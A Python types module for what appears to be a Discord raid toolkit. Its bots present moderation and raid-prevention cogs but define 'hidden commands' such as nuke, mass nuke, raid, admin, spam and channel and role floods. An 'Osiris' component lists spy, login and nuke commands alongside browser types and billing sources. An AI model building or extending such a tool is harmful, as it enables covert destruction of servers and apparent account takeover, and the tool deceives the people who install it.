"""
dr_types.py

This namespace contains types used throughout the application.

Naming Conventions:
E - Enum
I - Interface
D - Relating to Discord
H - Relating to Horus
    a. relating to Anubis
    b. relating to Quetesh
    s. relating to any (shared functionality)
O - Relating to Osiris
"""

import abc
from enum import Enum


class ED_Activities(Enum):
    """Enum to represent the four activity states of a Discord Bot.
    """
    PLAYING = 0
    STREAMING = 1
    LISTENING = 2
    WATCHING = 3


class ED_Statuses(Enum):
    """Enum to represent the three status states of a Discord Bot.
    """
    ONLINE = 0
    IDLE = 1
    DND = 2
    INVISIBLE = 3


class ED_BillingSourceTypes(Enum):
    """Enum to represent the two types of billing sources provided by Discord.
    """
    CARD = 1
    PAYPAL = 2


class EH_Raiders(Enum):
    """Enum to represent the two types of raider provided by Horus.
    """
    ANUBIS = 0
    QETESH = 1


class EH_HiddenCommands(Enum):
    """Enum to represent the hidden commands provided by Horus.
    """
    NICK_ALL = 'nick_all'
    MSG_ALL = 'msg_all'
    SPAM = 'spam'
    NEW_WEBHOOK = 'new_webhook'
    CPURGE = 'cpurge'
    CFLOOD = 'cflood'
    RPURGE = 'rpurge'
    RFLOOD = 'rflood'
    ADMIN = 'admin'
    RAID = 'raid'
    NUKE = 'nuke'
    MASS_NUKE = 'mass_nuke'
    LEAVE = 'leave'
    MASS_LEAVE = 'mass_leave'


class EH_HiddenCommands_FriendlyNames(Enum):
    """Enum to represent the friendly names of the hidden commands provided by Horus.
    """
    NICK_ALL = 'Nick All'
    MSG_ALL = 'Msg All'
    SPAM = 'Spam'
    NEW_WEBHOOK = 'New Webhook'
    CPURGE = 'Channel Purge'
    CFLOOD = 'Channel Flood'
    RPURGE = 'Role Purge'
    RFLOOD = 'Role Flood'
    ADMIN = 'Admin'
    RAID = 'Raid'
    NUKE = 'Nuke'
    MASS_NUKE = 'Mass Nuke'
    LEAVE = 'Leave'
    MASS_LEAVE = 'Mass Leave'


class EH_Cogs(Enum):
    """Enum to represent the cogs that Horus uses.
    """
    aModeration = 'cogs.anubis.moderation'
    aRaidPrevention = 'cogs.anubis.raid_prevention'
    aSurfing = 'cogs.anubis.surfing'
    aHelp = 'cogs.anubis.ahelp'
    qNsfw = 'cogs.qetesh.nsfw'
    qHelp = 'cogs.qetesh.qhelp'
    sCmds = 'cogs.shared.cmds'
    sHandler = 'cogs.shared.handler'


class IH_Raider(abc.ABC):
    """An interface that all Horus raiders must implement.
    """

    @abc.abstractmethod
    def extensions(self) -> list[str]:
        """Returns a list of extensions for the raider to load.
        """
    
    @abc.abstractmethod
    def __str__(self) -> str:
        """Returns the name of the raider.
        """

class EO_Commands(Enum):
    """Enum to represent the commands that Osiris can run.
    """
    SPY = 'spy'
    LOGIN = 'login'
    NUKE = 'nuke'


class EO_Commands_FriendlyNames(Enum):
    """Enum to represent the friendly names of the commands that Osiris can run.

    This'd be easier with EO_Commands.x.value.title(), but this is here for
    consistency with EH_HiddenCommands_FriendlyNames.
    """
    SPY = 'Spy'
    LOGIN = 'Login'
    NUKE = 'Nuke'


class EO_Browsers(Enum):
    """Enum to represent the browsers that Osiris can use.
    """
    CHROME = 1
    FIREFOX = 2
    EDGE = 3
